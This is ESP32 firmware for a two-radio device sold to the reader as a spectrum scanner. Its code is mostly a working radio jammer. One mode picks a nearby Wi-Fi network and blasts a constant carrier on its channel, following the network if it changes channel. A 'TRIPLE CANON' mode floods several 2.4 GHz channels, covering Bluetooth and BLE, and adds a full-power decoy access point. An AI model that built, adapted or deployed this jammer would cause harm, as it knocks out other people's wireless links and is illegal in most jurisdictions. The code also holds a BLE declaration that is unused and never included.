// ============================================================================
// 🛰️ SPECTRE TRIDENT MATRIX V6.5 - [PARTE 1 DE 3]
// ============================================================================
#include <WiFi.h>
#include <SPI.h>
#include <RF24.h>
#include <ezButton.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <esp_wifi.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#define RA_CE   4
#define RA_CSN  5
#define RB_CE   27
#define RB_CSN  15
#define BTN_PIN 16

RF24 radioA(RA_CE, RA_CSN);
RF24 radioB(RB_CE, RB_CSN);
ezButton button(BTN_PIN);

SPIClass *vspi = NULL;
SPIClass *hspi = NULL;
BLEAdvertising *pAdvertising = NULL; 

const int canalesAmetralladoraA[] = {2, 26};  
const int canalesAmetralladoraB[] = {38, 79}; 

const char* modes[] = 
{
  "ESCANER RUIDO  ",  
  "RADAR: QUIRURG ",  
  "ATAQUE: TRIPLE C"   
};

uint8_t opcion_visualizada = 0; 
bool accion_activa = false;       

int numRedes = 0;
int redSeleccionada = 0;
bool radarAtacando = false;
int canalObjetivo = 0;
String nombreObjetivo = "";
String nombreObjetivoCompleto = "";
bool necesitaEscanear = true;

unsigned long ultimoRastreoTime = 0; 
const unsigned long INTERVALO_RASTREO = 5000;
unsigned long tiempoPresionado = 0;
const unsigned long TIEMPO_LARGO = 800;
bool botonPresionadoAntes = false;
unsigned long ultimoToqueSoltado = 0;

int sub_pantalla_pasiva = 0;
#define MAX_REDES_MUESTRA 4
String sub_ssids[MAX_REDES_MUESTRA];
int sub_rssi[MAX_REDES_MUESTRA];
int total_redes_detectadas = 0;

int potencia_acumulada_canales[16]; 
volatile unsigned long contador_paquetes_promiscuos = 0;
unsigned long paquetes_por_canal[16];
unsigned long tiempo_ultimo_salto_promiscuo = 0;
int canal_promiscuo_actual = 1;

int canales_ruido[125]; 

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  contador_paquetes_promiscuos++;
}

void actualizarPantallaOLED();
void loopCore0( void * pvParameters );

TaskHandle_t TareaCore0;

void setup() {
  Serial.begin(115200);
  button.setDebounceTime(40);
  pinMode(BTN_PIN, INPUT_PULLUP);
  
  Wire.begin(21, 22); 
  if(display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    display.clearDisplay(); display.display();
  }
  
  WiFi.mode(WIFI_OFF); delay(100);

  vspi = new SPIClass(VSPI); hspi = new SPIClass(HSPI);
  vspi->begin(18, 19, 23, 5); hspi->begin(14, 12, 13, 15); 

  if (radioA.begin(vspi)) {
    radioA.setAutoAck(false); radioA.setRetries(0, 0); radioA.setPayloadSize(5);
    radioA.setAddressWidth(3); radioA.setPALevel(RF24_PA_MAX); radioA.setDataRate(RF24_250KBPS);
    radioA.setCRCLength(RF24_CRC_DISABLED); radioA.stopListening();
  }

  if (radioB.begin(hspi)) {
    radioB.setAutoAck(false); radioB.setRetries(0, 0); radioB.setPayloadSize(5);
    radioB.setAddressWidth(3); radioB.setPALevel(RF24_PA_MAX); radioB.setDataRate(RF24_250KBPS);
    radioB.setCRCLength(RF24_CRC_DISABLED); radioB.stopListening();
  }

  for(int i=0; i<125; i++) canales_ruido[i] = 0;
  for(int i=0; i<16; i++) { potencia_acumulada_canales[i] = -100; paquetes_por_canal[i] = 0; }

  xTaskCreatePinnedToCore(loopCore0, "TareaRadioA", 10000, NULL, 1, &TareaCore0, 0);
  Serial.println("[SYSTEM] Nucleo de Radio Inicializado.");
  actualizarPantallaOLED();
}

void loopCore0( void * pvParameters ) {
  for(;;) {
    if (accion_activa && opcion_visualizada == 2) {
      for (int i = 0; i < 2; i++) {
        radioA.setChannel(canalesAmetralladoraA[i]);
        radioA.startConstCarrier(RF24_PA_MAX, canalesAmetralladoraA[i]);
        uint32_t ciclos_A = ESP.getCycleCount();
        while ((ESP.getCycleCount() - ciclos_A) < 28000) { uint8_t d = 0; }
      }
    } else {
      radioA.stopListening();
    }
    vTaskDelay(1 / portTICK_PERIOD_MS); 
  }
}

// ============================================================================
// 🛰️ SPECTRE TRIDENT MATRIX V6.5 - [PARTE 2 DE 3]
// ============================================================================

void loop() {
  button.loop();
  int estadoBoton = digitalRead(BTN_PIN);
  
  if (estadoBoton == LOW) {
    if (!botonPresionadoAntes) { tiempoPresionado = millis(); botonPresionadoAntes = true; }
    
    if ((millis() - tiempoPresionado > TIEMPO_LARGO) && botonPresionadoAntes) {
      botonPresionadoAntes = false;
      
      if (opcion_visualizada == 0) {
        if (!accion_activa) {
          accion_activa = true;
          sub_pantalla_pasiva = 0; 
          Serial.println("[SYSTEM] Suite Analitica Iniciada.");
          
          radioB.begin(hspi); radioB.setAutoAck(false); radioB.setRetries(0, 0);
          radioB.setPayloadSize(5); radioB.setAddressWidth(3); radioB.setPALevel(RF24_PA_MAX);
          radioB.setDataRate(RF24_250KBPS); radioB.setCRCLength(RF24_CRC_DISABLED); radioB.stopListening();
          for(int i = 0; i < 125; i++) canales_ruido[i] = 0;
        } else {
          accion_activa = false;
          radioB.stopListening();
          esp_wifi_set_promiscuous(false);
          WiFi.mode(WIFI_OFF); 
          Serial.println("[SYSTEM] Suite Analitica en Standby.");
        }
        actualizarPantallaOLED();
      }
      else if (opcion_visualizada == 2) {
        if (!accion_activa) {
          accion_activa = true;
          Serial.println("[SYSTEM] Canon AP Canal 7 Activado.");
          WiFi.mode(WIFI_AP); delay(50);
          WiFi.softAP("WALL_AFH", "12345678", 7, 0, 4); 
          esp_wifi_set_max_tx_power(78); delay(50);
        } else {
          accion_activa = false;
          radioB.stopListening();
          WiFi.mode(WIFI_OFF); 
          Serial.println("[SYSTEM] Canon Canal 7 Desactivado.");
        }
        actualizarPantallaOLED();
      }
      else if (opcion_visualizada == 1) {
        if (!accion_activa) { accion_activa = true; necesitaEscanear = true; radarAtacando = false; }
        else {
          if (!radarAtacando && numRedes > 0) {
            radarAtacando = true; canalObjetivo = WiFi.channel(redSeleccionada);
            nombreObjetivoCompleto = WiFi.SSID(redSeleccionada); nombreObjetivo = nombreObjetivoCompleto;
            if (nombreObjetivo.length() > 14) nombreObjetivo = nombreObjetivo.substring(0, 12) + "..";
            ultimoRastreoTime = millis();
          } else {
            accion_activa = false; radarAtacando = false; radioB.stopListening();
            WiFi.mode(WIFI_OFF);
            Serial.println("[SYSTEM] Radar en Standby.");
          }
        }
        actualizarPantallaOLED();
      }
      delay(400); 
    }
  } else {
    if (botonPresionadoAntes) {
      unsigned long duracion = millis() - tiempoPresionado;
      botonPresionadoAntes = false;
      
      if (duracion < TIEMPO_LARGO) {
        if (opcion_visualizada == 0 && accion_activa) {
          sub_pantalla_pasiva = (sub_pantalla_pasiva + 1) % 4; 
          actualizarPantallaOLED();
        }
        else if (opcion_visualizada == 1 && accion_activa && !radarAtacando) {
          if (numRedes > 0) { redSeleccionada = (redSeleccionada + 1) % numRedes; actualizarPantallaOLED(); }
        } else if (!accion_activa) {
          opcion_visualizada = (opcion_visualizada + 1) % 3; 
          radioB.stopListening();
          actualizarPantallaOLED();
        }
      }
    }
  }

  bool escaneando_ahora = false;
  if (opcion_visualizada == 1 && accion_activa && radarAtacando && (millis() - ultimoRastreoTime > INTERVALO_RASTREO)) {
    ultimoRastreoTime = millis(); escaneando_ahora = true; radioB.stopListening(); delay(5);
    int redesEncontradas = WiFi.scanNetworks(false, true);
    for (int i = 0; i < redesEncontradas; i++) {
      if (WiFi.SSID(i) == nombreObjetivoCompleto) {
        int nuevoCanal = WiFi.channel(i);
        if (nuevoCanal != canalObjetivo) { canalObjetivo = nuevoCanal; actualizarPantallaOLED(); }
        break;
      }
    }
    escaneando_ahora = false;
  }

  if (accion_activa && !escaneando_ahora) {
    if (opcion_visualizada == 2) {
      for (int i = 0; i < 2; i++) {
        radioB.setChannel(canalesAmetralladoraB[i]);
        radioB.startConstCarrier(RF24_PA_MAX, canalesAmetralladoraB[i]);
        uint32_t ciclos_B = ESP.getCycleCount();
        while ((ESP.getCycleCount() - ciclos_B) < 28000) { yield(); }
      }
    }
    else if (opcion_visualizada == 1 && radarAtacando) {
      int canalRadioNRF = (2412 + (canalObjetivo - 1) * 5) - 2400;
      radioB.setChannel(canalRadioNRF); radioB.startConstCarrier(RF24_PA_MAX, canalRadioNRF);
    }
    else if (opcion_visualizada == 0) {
      if (sub_pantalla_pasiva == 0) {
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_OFF); 
        radioB.powerUp();
        for (int i = 0; i < 125; i++) {
          radioB.stopListening(); radioB.setChannel(i); radioB.startListening(); 
          delayMicroseconds(130); 
          if (radioB.testRPD()) {
            canales_ruido[i] = 20; 
          } else {
            if (canales_ruido[i] > 0) canales_ruido[i] -= 2; 
          }
        }
        radioB.stopListening();
        actualizarPantallaOLED();
        delay(5);
      }
      else if (sub_pantalla_pasiva == 1 || sub_pantalla_pasiva == 2) {
        radioB.stopListening(); 
        static unsigned long ultimoEscaneoPasivo = 0;
        if (millis() - ultimoEscaneoPasivo > 4000 || total_redes_detectadas == 0) {
          WiFi.mode(WIFI_STA); delay(10);
          int n = WiFi.scanNetworks(false, true, false, 60);
          if (n >= 0) {
            total_redes_detectadas = n;
            for(int i=0; i<16; i++) potencia_acumulada_canales[i] = -100;
            int limite = (n > MAX_REDES_MUESTRA) ? MAX_REDES_MUESTRA : n;
            for (int i = 0; i < limite; i++) {
              sub_ssids[i] = WiFi.SSID(i);
              if (sub_ssids[i].length() > 10) sub_ssids[i] = sub_ssids[i].substring(0, 8) + "..";
              sub_rssi[i] = WiFi.RSSI(i);
              int ch = WiFi.channel(i);
              if (ch >= 1 && ch <= 14 && WiFi.RSSI(i) > potencia_acumulada_canales[ch]) {
                potencia_acumulada_canales[ch] = WiFi.RSSI(i);
              }
            }
          }
          WiFi.scanDelete();
          ultimoEscaneoPasivo = millis();
        }
        actualizarPantallaOLED();
      }
      else if (sub_pantalla_pasiva == 3) {
        radioB.stopListening();
        WiFi.mode(WIFI_STA); delay(10);
        esp_wifi_set_promiscuous_rx_cb(reinterpret_cast<wifi_promiscuous_cb_t>(sniffer_callback)); 
        esp_wifi_set_promiscuous(true);
        
        if (millis() - tiempo_ultimo_salto_promiscuo > 120) {
          paquetes_por_canal[canal_promiscuo_actual] = contador_paquetes_promiscuos;
          canal_promiscuo_actual++;
          if (canal_promiscuo_actual > 13) canal_promiscuo_actual = 1;
          esp_wifi_set_channel(canal_promiscuo_actual, WIFI_SECOND_CHAN_NONE);
          contador_paquetes_promiscuos = 0;
          tiempo_ultimo_salto_promiscuo = millis();
        }
        actualizarPantallaOLED();
      }
    }
  } 
  else {
    static unsigned long ultimoRefrescoEstatico = 0;
    if (millis() - ultimoRefrescoEstatico > 100) {
      ultimoRefrescoEstatico = millis();
      actualizarPantallaOLED();
    }
  }
}

// ============================================================================
// 🛰️ SPECTRE TRIDENT MATRIX V6.5 - [PARTE 3 DE 3]
// ============================================================================

void actualizarPantallaOLED() {
  if (opcion_visualizada == 1 && accion_activa && necesitaEscanear && !radarAtacando) {
    display.clearDisplay(); display.drawRect(0, 0, 128, 64, SSD1306_WHITE);
    display.setTextSize(1); display.setCursor(15, 25); display.print("ESCANEANDO AIRE..."); display.display();
    WiFi.mode(WIFI_STA); delay(50);
    numRedes = WiFi.scanNetworks(); redSeleccionada = 0; necesitaEscanear = false;
  }

  display.clearDisplay();
  display.drawRect(0, 0, 128, 64, SSD1306_WHITE);
  
  float temp_celsius = temperatureRead();
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(90, 0); 
  if (temp_celsius > 65.0 && (millis() / 300) % 2 == 0) { display.print("!HOT!"); }
  else { display.print(String((int)temp_celsius) + "C"); }

  display.drawFastHLine(0, 16, 128, SSD1306_WHITE);
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(6, 5); display.print(modes[opcion_visualizada]);
  
  if (opcion_visualizada == 0 && accion_activa) {
    if (sub_pantalla_pasiva == 0) {
      for (int i = 0; i < 125; i++) {
        if (canales_ruido[i] > 0) {
          int altura_pixel = map(canales_ruido[i], 0, 20, 0, 46);
          if (altura_pixel > 46) altura_pixel = 46;
          if (altura_pixel < 0)  altura_pixel = 0;
          display.drawFastVLine(i + 2, 62 - altura_pixel, altura_pixel, SSD1306_WHITE);
        }
      }
      display.drawFastHLine(2, 62, 124, SSD1306_WHITE);
    }
    else if (sub_pantalla_pasiva == 1) {
      display.setCursor(4, 19); display.print("LISTA RSSI:");
      if (total_redes_detectadas == 0) {
        display.setCursor(15, 36); display.print("Escaneando...");
      } else {
        int lim = (total_redes_detectadas > MAX_REDES_MUESTRA) ? MAX_REDES_MUESTRA : total_redes_detectadas;
        for(int i=0; i<lim; i++) {
          display.setCursor(6, 28 + (i * 9));
          display.print(sub_ssids[i] + " -> " + String(sub_rssi[i]) + "dBm");
        }
      }
    }
    else if (sub_pantalla_pasiva == 2) {
      display.setCursor(4, 19); display.print("CURVAS WI-FI:");
      display.drawFastHLine(4, 58, 120, SSD1306_WHITE);
      for(int i=1; i<=13; i++) {
        int x_pos = map(i, 1, 13, 10, 115);
        display.drawFastVLine(x_pos, 56, 3, SSD1306_WHITE);
        if (i == 1 || i == 6 || i == 11) {
          display.setCursor(x_pos - 2, 48); display.print(String(i));
        }
        if (potencia_acumulada_canales[i] > -100) {
          int h_parabola = map(potencia_acumulada_canales[i], -100, -30, 2, 22);
          display.drawCircle(x_pos, 58, h_parabola, SSD1306_WHITE);
        }
      }
    }
    else if (sub_pantalla_pasiva == 3) {
      display.setCursor(4, 19); display.print("SATURACION REAL:");
      int canales_criticos[] = {1, 6, 11};
      for(int i=0; i<3; i++) {
        int ch = canales_criticos[i];
        int pks = paquetes_por_canal[ch];
        int porcentaje = map(pks, 0, 150, 0, 100); 
        if (porcentaje > 100) porcentaje = 100;
        
        display.setCursor(6, 30 + (i * 11));
        display.print("CH" + String(ch) + ":" + String(porcentaje) + "%");
        display.drawRect(52, 31 + (i * 11), 66, 6, SSD1306_WHITE);
        display.fillRect(54, 33 + (i * 11), map(porcentaje, 0, 100, 0, 62), 2, SSD1306_WHITE);
      }
    }
  }
  else if (!accion_activa) {
    display.setCursor(10, 26); display.print("Opcion de Menu");
    display.setCursor(10, 44); display.print("[Manten presionado]");
  } 
  else {
    display.setCursor(10, 26);
    switch (opcion_visualizada) {
      case 1:
        if (radarAtacando) {
          display.print("TRACKING ACTIVO!"); display.setCursor(10, 38);
          display.print("SSID: " + nombreObjetivo); display.setCursor(10, 48);
          display.print("Canal Actual: " + String(canalObjetivo));
        } else {
          if (numRedes == 0) { display.print("Sin redes halladas"); } 
          else {
            String ssidActual = WiFi.SSID(redSeleccionada);
            if (ssidActual.length() > 14) ssidActual = ssidActual.substring(0, 12) + "..";
            display.print("SSID: " + ssidActual); display.setCursor(10, 38);
            display.print("Canal Router: " + String(WiFi.channel(redSeleccionada))); display.setCursor(10, 48);
            display.print("Red: " + String(redSeleccionada + 1) + " / " + String(numRedes));
          }
        }
        break;
      case 2: 
        display.print("TRIPLE CANON ON");
        display.setCursor(10, 36); display.print("MURO CH 7 (2442MHz)");
        display.setCursor(10, 48); display.print("M: 2,26,38,79 + BLE");
        break;
    }
  }
  display.display();
}
